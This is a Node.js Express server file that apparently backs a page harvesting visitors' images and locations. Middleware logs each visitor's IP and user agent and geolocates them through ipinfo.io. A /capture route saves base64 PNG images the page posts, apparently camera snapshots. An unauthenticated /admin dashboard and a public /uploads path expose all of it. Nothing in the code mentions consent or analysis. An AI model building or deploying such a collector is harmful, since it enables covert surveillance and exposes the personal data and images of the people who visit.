const express = require("express");
const fs = require("fs");
const path = require("path");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

// Ensure uploads folder exists
const UPLOADS_DIR = path.join(__dirname, "uploads");
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

// Map for user sessions
let userFolders = {};

// Helper: get public IP info
async function getIpInfo(ip) {
  try {
    const token = "YOUR_IPINFO_TOKEN"; // free token from ipinfo.io
    const res = await fetch(`https://ipinfo.io/${ip}?token=${token}`);
    const data = await res.json();
    return data; // { ip, city, region, country, loc, ... }
  } catch {
    return {};
  }
}

// Middleware to assign folder per IP + UA
app.use(async (req, res, next) => {
  if (req.path.startsWith("/admin") || req.path.startsWith("/uploads")) {
    return next();
  }

  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
  const ua = req.headers["user-agent"] || "unknown";
  const key = ip + "___" + ua;

  if (!userFolders[key]) {
    const timestamp = Date.now();
    const safeIp = ip.replace(/[:\.]/g, "_");
    const safeUa = ua.substring(0, 50).replace(/[^a-zA-Z0-9]/g, "_");
    const folderName = `${timestamp}_${safeIp}_${safeUa}`;
    const dir = path.join(UPLOADS_DIR, folderName);
    fs.mkdirSync(dir, { recursive: true });

    const ipInfo = await getIpInfo(ip);

    const meta = {
      folderName,
      ip,
      userAgent: ua,
      location: ipInfo,
      startTime: new Date().toISOString()
    };

    // Save info.json
    fs.writeFileSync(path.join(dir, "info.json"), JSON.stringify(meta, null, 2));
    userFolders[key] = meta;
  }

  req._userKey = key;
  next();
});

// Capture route
app.post("/capture", (req, res) => {
  const { image } = req.body;
  if (!image) return res.status(400).json({ error: "No image" });

  const meta = userFolders[req._userKey];
  const dir = path.join(UPLOADS_DIR, meta.folderName);

  const filename = `${Date.now()}.png`;
  const filePath = path.join(dir, filename);

  const base64Data = image.replace(/^data:image\/png;base64,/, "");
  fs.writeFileSync(filePath, base64Data, "base64");

  res.json({ success: true });
});

// Admin API
app.get("/admin/data", (req, res) => {
  const folders = fs.readdirSync(UPLOADS_DIR);
  const users = folders.map(folderName => {
    const folderPath = path.join(UPLOADS_DIR, folderName);
    let info = {};
    const infoPath = path.join(folderPath, "info.json");
    if (fs.existsSync(infoPath)) info = JSON.parse(fs.readFileSync(infoPath, "utf-8"));

    const images = fs.readdirSync(folderPath).filter(f => f.endsWith(".png"));
    return { folderName, info, images };
  });

  res.json(users);
});

// Serve admin page
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public/admin.html"));
});

app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));